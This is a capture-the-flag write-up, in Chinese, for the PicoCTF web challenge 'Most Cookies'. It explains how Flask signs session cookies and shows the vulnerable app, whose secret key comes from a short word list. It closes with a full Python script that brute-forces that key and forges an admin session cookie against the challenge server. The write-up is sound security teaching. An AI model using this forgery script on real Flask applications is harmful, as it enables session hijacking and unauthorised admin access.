---
title: PicoCTF - Most Cookies
tags: [PicoCTF, CTF, Web]

category: "Security > Practice > PicoCTF > Web"
---

# PicoCTF - Most Cookies
###### tags: `PicoCTF` `CTF` `Web`

## Background
[Python Flask session 學習心得](https://vocus.cc/article/634c1c7efd89780001237de9)
> 在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。

## Source code
:::spoiler Source Code
```python=
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()


```
:::
## Recon
這一題看起來很簡單，我一開始也想說只要用Burp的intruder爆破name就好，不過看了一下sauce，發現他還有一個驗證機制，就是判斷cookie的value要是admin，但看了一下cookie的形式發現有點類似JWT的感覺`eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZJEZ8A.b5j77V6nA0V6dzYvM_hg3yYRgJc`(當然它不是JWT只是形式有點像)，尤其是這學期修了CNS，所以對JWT直覺有點難搞，果不其然，在sauce的第7行有設定`secret_key`當作session簽章的依據，然後在`/display`的地方進行驗證
1. `name`參數要有值且必須是`cookie_names` list的其中一種
2. session的`very_auth`的value一定要是admin
3. session的signature也要forge

## Exploit - Brute Force
```python=
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

if __name__=='__main__':
	for name in cookie_names:
		session = {}
		session["very_auth"] = "admin"
		cookie = encodeFlaskCookie(name, session)
		r = requests.get("http://mercury.picoctf.net:6259/display", cookies={"session":cookie}, allow_redirects=False)
		if "picoCTF" in r.text:
			print(r.text)
			break
```
## Reference
[picoCTF 2021 Most Cookies](https://youtu.be/8DrqOFr_SV8)
[manageFlaskSession.py source code](https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe)
[Python Web Flask — 如何透過Form取得資料](https://medium.com/seaniap/python-web-flask-如何透過form取得資料-7a63ebf9ff1f)
[[Flask教學] Flask Session 使用方法和介紹](https://www.maxlist.xyz/2019/06/29/flask-session/)
[Most Cookies - Write up 1](https://picoctf2021.haydenhousen.com/web-exploitation/most-cookies)
[Most Cookies - Write up 2](https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Most%20Cookies/MostCookies.md)